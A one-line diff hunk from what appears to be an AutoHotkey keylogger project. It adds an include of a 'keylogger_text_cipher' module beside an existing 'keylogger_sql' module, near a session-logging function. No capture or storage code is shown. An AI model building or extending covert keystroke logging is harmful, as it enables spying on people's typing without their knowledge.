@@ -899,6 +899,7 @@ KL_LogSession(kind, duration_ms := unset) {
 
 
 
+#Include keylogger_text_cipher.ahk
 #Include keylogger_sql.ahk
 
 
